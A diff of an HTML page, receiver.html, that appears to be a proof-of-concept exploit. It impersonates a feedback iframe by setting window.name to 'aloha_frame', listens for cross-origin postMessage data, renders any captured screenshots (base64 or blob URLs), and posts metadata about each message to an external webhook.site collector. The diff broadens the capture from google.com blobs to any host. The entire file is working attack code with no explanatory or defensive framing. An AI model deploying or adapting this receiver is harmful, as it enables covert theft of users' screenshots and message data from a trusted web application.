@@ -1,67 +1,69 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Receiver Ready (Binary-Aware)</h3>
+    <h2>receiver.html loaded</h2>
     <script>
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with yours
+      window.name = "aloha_frame"; // Critical: impersonate the real feedback iframe
+
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with your webhook
 
       function deepFindScreenshot(obj) {
         const str = JSON.stringify(obj);
         const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-        const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9\-]+/i);
+        const blob = str.match(/blob:https:\/\/[a-z0-9.-]+\/[a-z0-9\-]+/i);
         return base64 ? base64[0] : (blob ? blob[0] : null);
       }
 
       async function handleBinary(data) {
         if (data instanceof Blob) {
-          console.log("📦 Received Blob");
+          console.log("🟢 Blob received");
           const url = URL.createObjectURL(data);
           const img = new Image();
           img.src = url;
-          img.style = "max-width:100%;border:2px solid green";
+          img.style = "max-width:100%;border:3px solid green";
           document.body.appendChild(img);
         } else if (data instanceof ArrayBuffer) {
-          console.log("📦 Received ArrayBuffer");
+          console.log("🔵 ArrayBuffer received");
           const blob = new Blob([data], { type: "image/png" });
           const url = URL.createObjectURL(blob);
           const img = new Image();
           img.src = url;
-          img.style = "max-width:100%;border:2px solid blue";
+          img.style = "max-width:100%;border:3px solid blue";
           document.body.appendChild(img);
         } else if (typeof data === "object") {
           const found = deepFindScreenshot(data);
           if (found) {
             const img = new Image();
             img.src = found;
-            img.style = "max-width:100%;border:2px solid red";
+            img.style = "max-width:100%;border:3px solid red";
             document.body.appendChild(img);
           }
         }
       }
 
       window.addEventListener("message", async (e) => {
-        console.log("📩 postMessage received:", e.origin);
+        try {
+          console.log("📩 postMessage from:", e.origin);
+          console.log("🧾 Raw data:", e.data);
 
-        const data = e.data;
-        const dataType = Object.prototype.toString.call(data);
+          await handleBinary(e.data);
 
-        console.log("📦 Data type:", dataType);
-
-        await handleBinary(data);
-
-        fetch(webhookURL, {
-          method: "POST",
-          mode: "no-cors",
-          body: JSON.stringify({
-            origin: e.origin,
-            keys: typeof data === "object" ? Object.keys(data || {}) : "binary",
-            containsScreenshot: !!deepFindScreenshot(data),
-            timestamp: new Date().toISOString()
-          })
-        });
+          fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify({
+              origin: e.origin,
+              type: Object.prototype.toString.call(e.data),
+              containsScreenshot: !!deepFindScreenshot(e.data),
+              timestamp: new Date().toISOString()
+            })
+          });
+        } catch (err) {
+          console.error("❌ Error in message handler:", err);
+        }
       });
 
-      console.log("✅ Binary-aware receiver initialized");
+      console.log("✅ receiver.html active and impersonating aloha_frame");
     </script>
   </body>
 </html>
